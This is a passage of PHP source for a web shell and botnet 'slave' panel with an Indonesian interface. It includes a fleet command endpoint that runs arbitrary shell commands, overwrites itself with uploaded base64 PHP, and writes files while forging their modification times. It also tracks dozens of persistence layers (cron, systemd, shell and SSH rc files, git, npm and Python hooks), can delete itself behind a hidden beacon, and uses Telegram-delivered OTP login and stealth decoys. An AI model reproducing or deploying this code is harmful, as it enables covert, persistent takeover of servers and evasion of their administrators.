    $wrapInfo = []; foreach ($wrappers as $w) $wrapInfo[] = ['path'=>$w,'exists'=>file_exists($w),'size'=>file_exists($w)?(int)@filesize($w):0];
    $daemon = wn_daemon_status(); $watchdog = wn_watchdog_status(); $sysd = wn_systemd_status();
    $liveFile = wn_state_dir() . '/.lv_' . substr(md5($__B), 0, 8);
    $liveAge = file_exists($liveFile) ? (time() - filemtime($liveFile)) : -1;
    $liveActive = ($liveAge >= 0 && $liveAge <= 30);
    $hostName = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'localhost');
    $sysHost = @gethostname() ?: '?';
    $curUser = function_exists('posix_getpwuid') ? (@posix_getpwuid(posix_getuid())['name'] ?? '?') : (@getenv('USER') ?: '?');
    $isRoot = ($curUser === 'root');
    $serverIp = $_SERVER['SERVER_ADDR'] ?? get_real_ip();
    $lingerUser = $curUser !== '?' ? $curUser : null;
    $statusMap = wn_layer_manager()->statusAll(['home'=>$home,'linger_user'=>$lingerUser]);
    $L = function($key, $field = 'active', $default = false) use ($statusMap) { return isset($statusMap[$key]) ? ($statusMap[$key][$field] ?? $default) : $default; };
    $cronLayer = $statusMap['cron'] ?? ['active'=>false,'reboot'=>false];
    $layers = [
        'daemon'=>$L('daemon'),'watchdog'=>$L('watchdog'),'systemd'=>$L('systemd'),
        'reboot_cron'=>!empty($cronLayer['reboot']),'cron'=>!empty($cronLayer['active']),
        'bash_logout'=>$L('bash_logout'),'linger'=>$L('linger'),
        'shell_rc'=>$L('shell_rc'),'ssh_rc'=>$L('ssh_rc'),'at_job'=>$L('at_job'),
        'npm_hooks'=>$L('npm_hooks'),'npm_count'=>$statusMap['npm_hooks']['count'] ?? 0,
        'composer_hooks'=>$L('composer_hooks'),'composer_count'=>$statusMap['composer_hooks']['count'] ?? 0,
        'shell_trap'=>$L('shell_trap'),
        'git_hook'=>$L('git_hook'),'git_hook_count'=>$statusMap['git_hook']['count'] ?? 0,
        'systemd_timer'=>$L('systemd_timer'),'xdg_autostart'=>$L('xdg_autostart'),
        'tmux_hook'=>$L('tmux_hook'),'vim_rc'=>$L('vim_rc'),
        'python_site'=>$L('python_site'),'python_site_count'=>$statusMap['python_site']['count'] ?? 0,
        'ssh_config'=>$L('ssh_config'),'npmrc'=>$L('npmrc'),
        'emacs_rc'=>$L('emacs_rc'),'lessfilter'=>$L('lessfilter'),
        'xsession_rc'=>$L('xsession_rc'),
        'systemd_env'=>$L('systemd_env'),'ghost_trap'=>$L('ghost_trap'),
    ];
    return ['status'=>'success','host'=>$hostName,'hostname'=>$sysHost,'server_ip'=>$serverIp,'unix_user'=>$curUser,'is_root'=>$isRoot,'live_active'=>$liveActive,'live_age'=>$liveAge,'backup_name'=>wn_backup_filename(),'watchers'=>$wInfo,'watchers_alive'=>count(array_filter($wInfo, function ($x) { return $x['exists']; })),'wrappers'=>$wrapInfo,'wrappers_alive'=>count(array_filter($wrapInfo, function ($x) { return $x['exists']; })),'has_cron'=>!empty($cronLayer['active']),'has_reboot'=>!empty($cronLayer['reboot']),'daemon'=>$daemon,'watchdog'=>$watchdog,'systemd'=>$sysd,'state_dir'=>wn_state_dir(),'shell_available'=>is_shell_available(),'stealth_enabled'=>wn_stealth_enabled(),'hidden'=>wn_is_hidden(),'layers'=>$layers,'layer_status'=>$statusMap,'php_web_version'=>PHP_VERSION,'home'=>$home ?: '?','stored_mtime'=>wn_get_stored_mtime(),'shell_mtime'=>file_exists(__FILE__) ? (int)@filemtime(__FILE__) : 0];
}
function dispatch_api($action) {
    $allowed = ['auto_install_watcher','auto_uninstall_watcher','watcher_status'];
    if (!in_array($action, $allowed, true)) sendJsonResponse(['status'=>'error','message'=>'Invalid action']);
    if ($action === 'auto_install_watcher') {
        $lockFile = wn_state_dir() . '/.install.lock';
        $lockFp = @fopen($lockFile, 'c');
        if (!$lockFp) sendJsonResponse(['status'=>'error','message'=>'Cannot create lock']);
        if (!@flock($lockFp, LOCK_EX | LOCK_NB)) { @fclose($lockFp); sendJsonResponse(['status'=>'error','busy'=>true,'message'=>'Install sedang berjalan. Tunggu 60-120 detik lalu klik Refresh.']); }
        @ftruncate($lockFp, 0); @fwrite($lockFp, (string)getmypid()); @fflush($lockFp);
        @set_time_limit(300); while (ob_get_level() > 0) @ob_end_clean(); @ob_start();
        try { $result = auto_install_watcher_controller(!empty($_GET['silent'])); @flock($lockFp, LOCK_UN); @fclose($lockFp); @unlink($lockFile); while (ob_get_level() > 0) @ob_end_clean(); if (is_array($result)) sendJsonResponse($result); sendJsonResponse(['status'=>'success','message'=>'OK']); }
        catch (Throwable $e) { @flock($lockFp, LOCK_UN); @fclose($lockFp); @unlink($lockFile); while (ob_get_level() > 0) @ob_end_clean(); sendJsonResponse(['status'=>'error','message'=>'Exception: ' . $e->getMessage()]); }
    }
    $map = ['auto_uninstall_watcher'=>'auto_uninstall_watcher_controller','watcher_status'=>'watcher_status_controller'];
    $fn = $map[$action]; @set_time_limit(120); while (ob_get_level() > 0) @ob_end_clean(); @ob_start();
    try { $result = $fn(); while (ob_get_level() > 0) @ob_end_clean(); if (is_array($result)) sendJsonResponse($result); sendJsonResponse(['status'=>'success','message'=>'OK']); }
    catch (Throwable $e) { while (ob_get_level() > 0) @ob_end_clean(); sendJsonResponse(['status'=>'error','message'=>'Exception: ' . $e->getMessage()]); }
}

/* ═══ AUTH / OTP ═══ */
function wn_auth_cookie_name() { return 'wn_a2'; }
function wn_auth_secret() { global $__B; return hash('sha256', 'auth:' . $__B . ':' . wn_get_salt()); }
function wn_issue_auth_cookie($ttl = 1800) {
    while (ob_get_level() > 0) @ob_end_clean();
    if (session_status() === PHP_SESSION_ACTIVE) @session_regenerate_id(true);
    $exp = time() + $ttl; $nonce = bin2hex(random_bytes(8));
    $sig = hash_hmac('sha256', $exp . '|' . $nonce, wn_auth_secret());
    $val = $exp . '.' . $nonce . '.' . $sig;
    $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') || (($_SERVER['SERVER_PORT'] ?? '') == 443);
    $params = ['path'=>'/','httponly'=>true,'samesite'=>'Lax']; if ($isHttps) $params['secure'] = true;
    if (!headers_sent()) { @header_remove('X-Powered-By'); setcookie(wn_auth_cookie_name(), $val, $params); }
    $_COOKIE[wn_auth_cookie_name()] = $val; wn_session_poison($ttl); return $val;
}
function wn_verify_auth_token($val) {
    if (empty($val) || !is_string($val)) return false;
    $p = explode('.', $val); if (count($p) !== 3) return false;
    list($exp, $nonce, $sig) = $p;
    if (!ctype_digit($exp) || (int)$exp < time()) return false;
    return hash_equals(hash_hmac('sha256', $exp . '|' . $nonce, wn_auth_secret()), $sig);
}
function wn_check_auth_cookie() { $n = wn_auth_cookie_name(); if (empty($_COOKIE[$n])) return false; return wn_verify_auth_token($_COOKIE[$n]); }
function wn_clear_auth_cookie() { $p = ['expires'=>time() - 3600,'path'=>'/','httponly'=>true,'samesite'=>'Lax']; if (!headers_sent()) setcookie(wn_auth_cookie_name(), '', $p); unset($_COOKIE[wn_auth_cookie_name()]); }
function wn_otp_file() {
    if (session_status() !== PHP_SESSION_ACTIVE) @session_start();
    if (session_status() === PHP_SESSION_ACTIVE) { if (empty($_SESSION['wn_otp_id'])) { try { $_SESSION['wn_otp_id'] = bin2hex(random_bytes(16)); } catch (Throwable $e) { $_SESSION['wn_otp_id'] = hash('sha256', 'otp:' . session_id() . ':' . microtime(true)); } } $id = $_SESSION['wn_otp_id']; }
    else $id = 'ip_' . md5(get_real_ip());
    return wn_blend_name('otp') . '_' . $id;
}
function wn_otp_store($code) {
    $f = wn_otp_file(); $json = json_encode(['c'=>(string)$code,'t'=>time()]);
    if ($json === false) return false;
    $written = wn_call('fpc', $f, $json, LOCK_EX);
    if (!is_int($written) || $written <= 0) { $fp = @fopen($f, 'c'); if ($fp === false) return false; @flock($fp, LOCK_EX); @ftruncate($fp, 0); $w = @fwrite($fp, $json); @fflush($fp); @flock($fp, LOCK_UN); @fclose($fp); if (!is_int($w) || $w <= 0) return false; }
    @chmod($f, 0600); return true;
}
function wn_otp_verify($input) {
    $f = wn_otp_file(); if (!file_exists($f)) return ['ok'=>false,'msg'=>'Request OTP first.'];
    $raw = wn_call('fgc', $f); if (!is_string($raw) || $raw === '') { $raw = @file_get_contents($f); if (!is_string($raw) || $raw === '') { @unlink($f); return ['ok'=>false,'msg'=>'OTP unreadable.']; } }
    $data = json_decode($raw, true);
    if (!is_array($data) || empty($data['c']) || empty($data['t'])) { @unlink($f); return ['ok'=>false,'msg'=>'OTP invalid.']; }
    if (time() - (int)$data['t'] > 300) { @unlink($f); return ['ok'=>false,'msg'=>'OTP expired.']; }
    if (!hash_equals((string)$data['c'], (string)$input)) return ['ok'=>false,'msg'=>'Invalid OTP.'];
    @unlink($f); return ['ok'=>true];
}
if (isset($_GET['wn_otp']) && $_GET['wn_otp'] === 'gen') {
    while (ob_get_level() > 0) @ob_end_clean();
    header('Content-Type: text/plain');
    $expected = hash('sha256', 'wn_tg:' . $__B . ':' . wn_get_salt());
    if (!hash_equals($expected, (string)($_GET['key'] ?? ''))) { http_response_code(403); echo 'FORBIDDEN'; exit; }
    echo wn_stealth_gen_otp(300); exit;
}
/* ═══ FLEET MASTER (top-level) ═══ */
function wn_fleet_key() { $f = wn_blend_name('fleet_key'); if (!file_exists($f)) return ''; $k = trim((string)wn_call('fgc', $f)); return strlen($k) >= 16 ? $k : ''; }
function wn_fleet_key_set($key) { $f = wn_blend_name('fleet_key'); wn_call('fpc', $f, $key, LOCK_EX); @chmod($f, 0600); return true; }
function wn_fleet_server_id() {
    $f = wn_blend_name('fleet_id');
    if (file_exists($f)) { $id = trim((string)wn_call('fgc', $f)); if (strlen($id) >= 6) return $id; }
    $h = $_SERVER['HTTP_HOST'] ?? (gethostname() ?: 'unknown');
    $id = substr(hash('sha256', 'sid:' . $h . ':' . __DIR__), 0, 12);
    wn_call('fpc', $f, $id, LOCK_EX); @chmod($f, 0600); return $id;
}
function wn_fleet_self_url() {
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $path = $_SERVER['SCRIPT_NAME'] ?? ('/' . ($GLOBALS['CURRENT_SHELL'] ?? 'slave.php'));
    return $scheme . '://' . $host . $path;
}
function wn_fleet_bootstrap() {
    global $__B;
    while (ob_get_level() > 0) @ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    if (wn_fleet_key() !== '') { http_response_code(403); echo 'already_joined'; exit; }
    $newKey = (string)($_POST['key'] ?? ($_GET['key'] ?? ''));
    if (strlen($newKey) < 16) { http_response_code(400); echo 'invalid_key'; exit; }
    $expectSig = hash_hmac('sha256', 'boot:' . $newKey, $__B);
    $givenSig = (string)($_POST['sig'] ?? ($_GET['sig'] ?? ''));
    if ($givenSig === '' || !hash_equals($expectSig, $givenSig)) { http_response_code(403); echo 'forbidden'; exit; }
    wn_fleet_key_set($newKey);
    echo 'ok:' . wn_fleet_server_id(); exit;
}
function wn_fleet_handle() {
    while (ob_get_level() > 0) @ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    header('X-WN-Fleet-Version: 1');
    $fleetKey = wn_fleet_key();
    if ($fleetKey === '') { http_response_code(503); echo json_encode(['status'=>'error','message'=>'no_fleet_key']); exit; }
    $given = $_SERVER['HTTP_X_WN_FLEET_KEY'] ?? ($_GET['fleet_key'] ?? ($_POST['fleet_key'] ?? ''));
    if (!hash_equals($fleetKey, (string)$given)) { http_response_code(403); echo json_encode(['status'=>'error','message'=>'forbidden']); exit; }
    $op = strtolower((string)($_GET['op'] ?? 'ping'));
    $result = ['status'=>'success','op'=>$op,'server_id'=>wn_fleet_server_id(),'host'=>$_SERVER['HTTP_HOST'] ?? '?','url'=>wn_fleet_self_url(),'php'=>PHP_VERSION,'time'=>time()];
    switch ($op) {
        case 'ping': $result['pong'] = true; break;
        case 'status': try { $result['status_data'] = watcher_status_controller(); } catch (Throwable $e) { $result['status_data'] = ['error'=>$e->getMessage()]; } break;
        case 'install': try { $result['install'] = auto_install_watcher_controller(!empty($_GET['silent'])); } catch (Throwable $e) { $result['install'] = ['error'=>$e->getMessage()]; } break;
        case 'install_slave': try { $result['install'] = auto_install_watcher_controller(true, true); } catch (Throwable $e) { $result['install'] = ['error'=>$e->getMessage()]; } break;
        case 'uninstall': try { $result['uninstall'] = auto_uninstall_watcher_controller(); } catch (Throwable $e) { $result['uninstall'] = ['error'=>$e->getMessage()]; } break;
        case 'exec': $cmd = (string)($_GET['cmd'] ?? ($_POST['cmd'] ?? '')); if ($cmd === '') { $result['error'] = 'empty_cmd'; break; } $out = cmd_exec($cmd); $result['output'] = (string)$out; $result['exit_ok'] = ($out !== false); break;
        case 'deploy_module':
            $b64 = !empty($_POST['module_b64']) ? (string)$_POST['module_b64'] : '';
            if ($b64 === '') { $result['error'] = 'no_module'; break; }
            $raw = wn_call('b64d', $b64);
            if ($raw === false || strlen($raw) < 500 || strpos($raw, '<?php') === false) { $result['error'] = 'invalid_module'; break; }
            $target = __FILE__; $backup = $target . '.bak.' . date('YmdHis'); @copy($target, $backup);
            if (wn_call('fpc', $target, $raw) === false) { $result['error'] = 'write_failed'; break; }
            @chmod($target, 0644); wn_apply_mtime($target);
            $result['deployed'] = true; $result['size'] = strlen($raw); $result['backup'] = $backup; break;
        case 'put_file':
            $b64 = (string)($_POST['file_b64'] ?? ''); $dest = (string)($_POST['dest'] ?? ''); $fname = (string)($_POST['fname'] ?? 'upload.bin');
            if ($b64 === '' || $dest === '') { $result['error'] = 'missing_params'; break; }
            $raw = wn_call('b64d', $b64); if ($raw === false) { $result['error'] = 'b64_decode_failed'; break; }
            if (substr($dest, -1) === '/') $dest = rtrim($dest, '/') . '/' . $fname;
            global $specialDirectories, $rootPath;
            $allowed = isSafePath($dest, $rootPath, $specialDirectories);
            if (!$allowed) { foreach ($specialDirectories as $d) { if ($d && strpos($dest, $d) === 0) { $allowed = true; break; } } }
            if (!$allowed) { $result['error'] = 'unsafe_path'; break; }
            $dir = dirname($dest); if (!is_dir($dir)) @mkdir($dir, 0755, true);
            if (!is_dir($dir) || !is_writable($dir)) { $result['error'] = 'dir_not_writable'; break; }
            $isShellPath = (basename($dest) === basename(__FILE__)); $oldMtime = 0;
            if ($isShellPath) { $sm = wn_get_stored_mtime(); if ($sm > 0) $oldMtime = $sm; elseif (file_exists($dest)) $oldMtime = @filemtime($dest); }
            elseif (file_exists($dest)) $oldMtime = @filemtime($dest);
            if (wn_call('fpc', $dest, $raw) === false) { $result['error'] = 'write_failed'; break; }
            @chmod($dest, 0644); if ($oldMtime > 0) @touch($dest, $oldMtime, $oldMtime);
            if ($isShellPath) { $pf = wn_blend_name('integrity_pause'); wn_call('fpc', $pf, time(), LOCK_EX); @chmod($pf, 0600); }
            $result['saved'] = true; $result['size'] = strlen($raw); $result['path'] = $dest; break;
        case 'set_fleet_key': $newKey = (string)($_POST['new_key'] ?? ($_GET['new_key'] ?? '')); if (strlen($newKey) < 16) { $result['error'] = 'key_too_short'; break; } wn_fleet_key_set($newKey); $result['key_rotated'] = true; break;
        case 'whoami': $cfg = wn_cfg_b64(); $result['bot_b64'] = $cfg['k']; $result['chat_b64'] = $cfg['j']; $result['shell'] = basename(__FILE__); $result['root'] = realpath(__DIR__); $result['fleet_key'] = $fleetKey; $result['hidden'] = wn_is_hidden(); break;
        case 'hide':
            try {
                $sp = realpath(__FILE__) ?: (__DIR__ . '/' . basename(__FILE__)); $dr = dirname($sp);
                if (!is_dir($dr) || !is_writable($dr)) { $result['error'] = 'docroot_not_writable'; break; }
                if (wn_is_hidden()) { $result['hidden'] = true; $result['already'] = true; break; }
                $bp = wn_state_dir() . '/.slave_hidden_backup.php';
                try { $tok = bin2hex(random_bytes(24)); } catch (Throwable $e) { $tok = hash('sha256', microtime(true) . mt_rand()); }
                if (@copy($sp, $bp) === false) { $result['error'] = 'backup_failed'; break; }
                @chmod($bp, 0600);
                $bn = '.cache_' . substr(hash('sha256', 'beacon:' . $tok), 0, 12) . '.php';
                $bpath = $dr . '/' . $bn; $sf = wn_hide_state_file();
                $bc = "<?php\nif((\$_GET['t']??'')!==" . var_export($tok, true) . "){http_response_code(404);exit;}\n\$b=" . var_export($bp, true) . ";\$t=" . var_export($sp, true) . ";\nif(!@is_file(\$b)){http_response_code(500);exit;}\nif(@is_file(\$t)&&@filesize(\$t)>500){@unlink(" . var_export($sf, true) . ");@unlink(__FILE__);echo 'ok';exit;}\nif(!@copy(\$b,\$t)){http_response_code(500);exit;}\n@chmod(\$t,0644);@unlink(" . var_export($sf, true) . ");@unlink(__FILE__);echo 'ok';\n";
                if (wn_call('fpc', $bpath, $bc) === false) { $result['error'] = 'beacon_write_failed'; @unlink($bp); break; }
                @chmod($bpath, 0644);
                $sc = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http'; $h = $_SERVER['HTTP_HOST'] ?? 'localhost';
                $bu = $sc . '://' . $h . '/' . $bn;
                wn_set_hidden_state(['hidden'=>true, 'beacon_url'=>$bu, 'token'=>$tok, 'backup_path'=>$bp, 'slave_path'=>$sp, 'hidden_at'=>time()]);
                if (!@unlink($sp)) { wn_set_hidden_state(null); @unlink($bpath); $result['error'] = 'unlink_failed'; break; }
                $result['hidden'] = true; $result['beacon_url'] = $bu; $result['token'] = $tok;
            } catch (Throwable $e) { $result['error'] = 'hide_exception: ' . $e->getMessage(); }
            break;
        case 'unhide':
            $st = wn_hide_state();
            if ($st && !empty($st['backup_path']) && @is_file($st['backup_path'])) {
                $sp = $st['slave_path'] ?? (__DIR__ . '/' . basename(__FILE__));
                if (@copy($st['backup_path'], $sp) !== false) @chmod($sp, 0644);
                wn_set_hidden_state(null);
                foreach ((array)glob(dirname($sp) . '/.cache_*.php') as $bf) { $bc = @file_get_contents($bf); if ($bc !== false && !empty($st['token']) && strpos($bc, $st['token']) !== false) @unlink($bf); }
            }
            $result['hidden'] = false; break;
        default: $result['status'] = 'error'; $result['error'] = 'unknown_op';
    }
    echo json_encode($result, JSON_UNESCAPED_SLASHES); exit;
}
function _fl_http($method, $url, $body = '', $headers = array(), $timeout = 20) {
    if (!is_array($headers)) $headers = array();
    $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    $headers[] = "Accept: */*";
    if ($method === "POST") { $headers[] = "Content-Type: application/x-www-form-urlencoded"; $headers[] = "Content-Length: " . strlen($body); }
    if (function_exists("curl_init")) {
        $ch = @wn_call("cu_i", $url);
        if ($ch !== false && $ch !== null) {
            @wn_call("cu_s", $ch, CURLOPT_RETURNTRANSFER, true); @wn_call("cu_s", $ch, CURLOPT_TIMEOUT, $timeout);
            @wn_call("cu_s", $ch, CURLOPT_CONNECTTIMEOUT, 10); @wn_call("cu_s", $ch, CURLOPT_SSL_VERIFYPEER, false);
            @wn_call("cu_s", $ch, CURLOPT_SSL_VERIFYHOST, false); @wn_call("cu_s", $ch, CURLOPT_FOLLOWLOCATION, true);
            @wn_call("cu_s", $ch, CURLOPT_MAXREDIRS, 5); @wn_call("cu_s", $ch, CURLOPT_HTTPHEADER, $headers);
            if ($method === "POST") { @wn_call("cu_s", $ch, CURLOPT_POST, true); @wn_call("cu_s", $ch, CURLOPT_POSTFIELDS, $body); }
            $r = @wn_call("cu_e", $ch); @wn_call("cu_c", $ch);
            if (is_string($r) && $r !== '') return $r;
        }
    }
    if (ini_get("allow_url_fopen")) {
        $opts = array("http" => array("method" => $method, "header" => implode("\r\n", $headers) . "\r\n", "timeout" => $timeout, "ignore_errors" => true, "follow_location" => 1, "max_redirects" => 5), "ssl" => array("verify_peer" => false, "verify_peer_name" => false));
        if ($method === "POST") $opts["http"]["content"] = $body;
        $r = @wn_call("fgc", $url, false, stream_context_create($opts));
        if (is_string($r) && $r !== '') return $r;
    }
    return false;
}

/* ═══ WEB ENTRY ═══ */
if (!headers_sent()) { @header_remove('X-Powered-By'); @header_remove('X-Powered-By-PHP'); }

if (isset($_GET['wn_tg']))              { wn_tg_callback_handle(); exit; }
if (isset($_GET['wn_fleet']))           { wn_fleet_handle(); exit; }
if (isset($_GET['wn_fleet_bootstrap'])) { wn_fleet_bootstrap(); exit; }
if (wn_is_hidden()) { wn_stealth_decoy(); }

@session_start();
wn_bootstrap();
try { wn_ts_dispatch(); } catch (Throwable $e) {}
if (!headers_sent()) { header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0'); header('Pragma: no-cache'); header('Expires: 0'); }
if (!wn_stealth_unlock()) { wn_stealth_jitter(); wn_stealth_decoy(); }
if (isset($_GET['action']) && !wn_check_auth_cookie()) sendJsonResponse(['status'=>'error','message'=>'unauthenticated','relogin'=>true]);
if (!wn_check_auth_cookie()) {
    $loginError = $loginSuccess = '';
    $clientIp = get_real_ip(); $blockKey = md5($clientIp);
    $blockFile = wn_blend_name('blocked') . '_' . $blockKey;
    $failFile = wn_blend_name('fail') . '_' . $blockKey;
    $isBlocked = false;
    if (file_exists($blockFile)) { $age = time() - (int)wn_call('fgc', $blockFile); if ($age < 1800) { $isBlocked = true; $loginError = "Terlalu banyak percobaan. Coba lagi " . ceil((1800 - $age) / 60) . " menit."; } else { @unlink($blockFile); @unlink($failFile); } }
    if (isset($_POST['request_otp']) && !$isBlocked) {
        $otpRateFile = wn_blend_name('otp') . '_rate_' . md5($clientIp);
        $lastOtpReq = file_exists($otpRateFile) ? (int)wn_call('fgc', $otpRateFile) : 0;
        if ($lastOtpReq > 0 && (time() - $lastOtpReq) < 30) { $loginError = "Tunggu " . (30 - (time() - $lastOtpReq)) . " detik."; }
        else { wn_call('fpc', $otpRateFile, (string)time(), LOCK_EX); @chmod($otpRateFile, 0600); $otp = sprintf("%06d", random_int(0, 999999)); if (!wn_otp_store($otp)) { $loginError = "Failed to store OTP."; } else { $sent = sendTelegramMessage($__B, $__C, "OTP CODE: $otp\n\nValid 5 min."); if ($sent) $loginSuccess = "OTP sent to Telegram."; else $loginError = "Gagal kirim Telegram."; } }
    }
    if (isset($_POST['verify_otp']) && !$isBlocked) {
        $inputOtp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
        if ($inputOtp === '') $loginError = "Enter OTP.";
        else { $res = wn_otp_verify($inputOtp); if ($res['ok']) { wn_issue_auth_cookie(1800); @unlink($failFile); $redirect = $_SERVER['SCRIPT_NAME'] ?? '/'; if (!headers_sent()) header('Location: ' . $redirect); else echo '<script>location.replace(' . json_encode($redirect) . ');</script>'; @session_write_close(); exit; } else { $loginError = $res['msg']; if ($res['msg'] === 'Invalid OTP.') { $failCount = (int)wn_call('fgc', $failFile) + 1; wn_call('fpc', $failFile, $failCount); if ($failCount >= 5) { wn_call('fpc', $blockFile, time()); sendTelegramMessage($__B, $__C, "[BLOCKED] IP: " . htmlspecialchars($clientIp, ENT_QUOTES, 'UTF-8') . "\n$failCount attempts", true); $loginError = "Too many. Tunggu 30 menit."; } } } }
    }
    ?>
    <!DOCTYPE html><html><head><meta charset="UTF-8"><title>Login</title>
    <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#0a0a0b;color:#ededef;font-family:-apple-system,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}.box{background:#141416;padding:40px;border-radius:16px;border:1px solid rgba(255,255,255,0.06);width:340px;}.box h2{font-size:22px;font-weight:600;margin-bottom:6px;}.box p{color:#8a8a95;font-size:12.5px;margin-bottom:24px;}input{width:100%;padding:10px 12px;background:#1a1a1e;border:1px solid rgba(255,255,255,0.06);color:#ededef;border-radius:8px;outline:none;font-size:14px;margin-bottom:10px;}button{background:#4ade80;color:#06110b;border:none;padding:11px;width:100%;border-radius:8px;cursor:pointer;font-weight:600;}.error{color:#f87171;font-size:12px;margin-bottom:10px;padding:8px 12px;background:rgba(248,113,113,0.1);border-radius:8px;}.success{color:#4ade80;font-size:12px;margin-bottom:10px;padding:8px 12px;background:rgba(74,222,128,0.1);border-radius:8px;}hr{border:none;border-top:1px solid rgba(255,255,255,0.06);margin:16px 0;}</style>
    </head><body><div class="box"><h2>Console</h2><p>Authentication required</p>
    <?php if (!empty($loginError)): ?><div class="error"><?= htmlspecialchars($loginError) ?></div><?php endif; ?>
    <?php if (!empty($loginSuccess)): ?><div class="success"><?= htmlspecialchars($loginSuccess) ?></div><?php endif; ?>
    <?php if (!$isBlocked): ?>
    <form method="post"><button type="submit" name="request_otp">Request OTP</button></form>
    <hr><form method="post"><input type="text" name="otp" placeholder="6-digit OTP" required maxlength="6" inputmode="numeric"><button type="submit" name="verify_otp">Login</button></form>
    <?php endif; ?>
    </div></body></html>
    <?php exit;
}
if (isset($_GET['logout'])) {
    wn_clear_auth_cookie();
    if (!headers_sent()) setcookie(wn_stealth_cookie_name(), '', ['expires'=>time() - 3600,'path'=>'/','httponly'=>true,'samesite'=>'Lax']);
    unset($_COOKIE[wn_stealth_cookie_name()]);
    if (session_status() === PHP_SESSION_ACTIVE) { $_SESSION = []; if (ini_get("session.use_cookies")) { $p = session_get_cookie_params(); setcookie(session_name(), '', time()-42000, $p["path"], $p["domain"], $p["secure"], $p["httponly"]); } @session_destroy(); }
    header('Location: ' . ($_SERVER['SCRIPT_NAME'] ?? '/')); exit;
}
$currentPath = $rootPath;
if (isset($_GET['path'])) { $rp = realpath($_GET['path']); if ($rp && isSafePath($rp, $rootPath, $specialDirectories)) $currentPath = $rp; else $error = "Invalid path"; }
if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) { $error = "Not accessible"; $currentPath = $rootPath; }
if (isset($_GET['action'])) dispatch_api($_GET['action']);
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Console</title>
<style>
:root{--bg:#0a0a0b;--surface:#141416;--surface-2:#1a1a1e;--border:rgba(255,255,255,0.06);--text:#ededef;--text-dim:#8a8a95;--text-mute:#5c5c66;--accent:#4ade80;--accent-soft:rgba(74,222,128,0.1);--danger:#f87171;--warning:#fbbf24;--warning-soft:rgba(251,191,36,0.1);--r-sm:8px;--r:12px;--r-lg:16px;}
*{margin:0;padding:0;box-sizing:border-box;-webkit-font-smoothing:antialiased;}
body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;font-size:13.5px;line-height:1.5;}
a{color:inherit;text-decoration:none;} button{font-family:inherit;font-size:inherit;color:inherit;cursor:pointer;}
.sidebar{position:fixed;top:0;left:0;width:216px;height:100%;padding:20px 12px;background:var(--bg);border-right:1px solid var(--border);overflow-y:auto;z-index:100;}
.brand{display:flex;align-items:center;gap:8px;padding:6px 10px 20px;font-weight:600;font-size:15px;}
.brand-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 12px var(--accent);}
.brand span{color:var(--text-dim);font-weight:500;}
.nav-item{display:flex;align-items:center;gap:10px;width:100%;padding:7px 10px;border-radius:var(--r-sm);background:transparent;border:none;color:var(--text-dim);font-size:13px;font-weight:500;text-align:left;transition:all .12s ease;}
.nav-item:hover{background:var(--surface);color:var(--text);} .nav-item.danger{color:var(--danger);}
.main{margin-left:216px;padding:24px 32px;max-width:1240px;}
.topbar{display:flex;flex-direction:column;gap:14px;padding:18px 20px;background:var(--surface);border:1px solid var(--border);border-radius:var(--r);margin-bottom:20px;}
.topbar-brand{display:flex;align-items:baseline;gap:16px;flex-wrap:wrap;padding-bottom:14px;border-bottom:1px solid var(--border);}
.wn-title{font-size:24px;font-weight:600;color:var(--accent);}
.wn-owner{font-family:"SF Mono",Consolas,monospace;font-size:11.5px;color:var(--text-mute);}
.topbar-pills{display:flex;align-items:center;flex-wrap:wrap;gap:8px;}
.pill{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:999px;background:var(--surface-2);color:var(--text-dim);font-size:11.5px;font-weight:500;}
.pill .dot{width:5px;height:5px;border-radius:50%;background:currentColor;}
.pill.root{background:rgba(248,113,113,0.1);color:var(--danger);}
.pill.on{background:var(--accent-soft);color:var(--accent);}
.pill.stealth{background:var(--warning-soft);color:var(--warning);}
.alert{padding:11px 14px;border-radius:var(--r-sm);margin-bottom:14px;font-size:13px;border-left:2px solid;}
.alert-danger{background:rgba(248,113,113,0.1);border-color:var(--danger);color:var(--danger);}
.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:36px 28px;text-align:center;}
.card-icon{width:48px;height:48px;margin:0 auto 18px;border-radius:50%;background:var(--accent-soft);display:flex;align-items:center;justify-content:center;}
.card-icon .dot{width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 12px var(--accent);}
.card h2{font-size:18px;font-weight:600;color:var(--accent);margin-bottom:8px;}
.card p{color:var(--text-dim);font-size:13px;margin-bottom:22px;max-width:420px;margin-left:auto;margin-right:auto;line-height:1.6;}
.card-meta{margin-top:28px;padding-top:20px;border-top:1px solid var(--border);display:flex;gap:16px;justify-content:center;flex-wrap:wrap;font-size:11.5px;color:var(--text-mute);}
.btn{padding:9px 16px;border-radius:var(--r-sm);background:var(--surface-2);border:1px solid var(--border);color:var(--text);font-weight:500;}
.btn:hover{background:rgba(255,255,255,0.05);}
.btn.primary{background:var(--accent);color:#06110b;border-color:var(--accent);}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.65);display:flex;align-items:center;justify-content:center;z-index:1000;opacity:0;visibility:hidden;transition:.2s;}
.modal.active{opacity:1;visibility:visible;}
.modal-content{background:var(--surface);border:1px solid var(--border);border-radius:var(--r-lg);width:min(900px,94vw);max-height:88vh;overflow-y:auto;}
